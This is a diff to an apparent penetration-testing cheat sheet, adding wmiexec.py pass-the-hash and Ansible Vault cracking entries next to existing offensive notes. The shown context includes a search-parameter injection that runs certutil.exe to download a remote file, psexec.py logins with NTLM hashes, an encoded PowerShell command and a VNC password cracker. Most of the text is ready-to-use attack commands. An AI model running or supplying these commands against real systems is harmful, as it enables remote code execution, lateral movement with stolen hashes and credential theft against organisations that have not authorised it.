@@ -182,6 +182,9 @@ http://172.31.1.24/?search=%00{.exec|certutil.exe%20-urlcache%20-f%20http://10.1
 psexec.py -hashes LM:NTLM administrator@10.200.200.127
 psexec.py domain/username:password@10.10.10.10
 
+[wmiexec]
+wmiexec.py -hashes LM:NTLM administrator@10.10.10.10
+
 [XHR Requests]
 ```
 var r = new XMLHttpRequest();
@@ -792,3 +795,15 @@ powershell.exe -nop -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHI
 [vnc crack]
 https://github.com/jeroennijhof/vncpwd
 vncpwd <vnc password file>
+
+[ansible crack]
+# crack with ansible2john if needed, make sure to preserver new lines"\n"
+# method 1
+echo '$ANSIBLE_VAULT;1.1;AES256
+36643662303931336362356361373334663632343139383832626130636237333134373034326565
+3736626632306265393565653338356138626433333339310a323832663233316666353764373733
+30613239313731653932323536303537623362653464376365383963373366336335656635666637
+3238313530643164320a336337303734303930303163326235623834383337343363326461653162
+33353861663464313866353330376566346636303334353732383564633263373862' | ansible-vault decrypt && echo
+# method 2 
+ansible-vault view --ask-vault-pass encrypted.txt
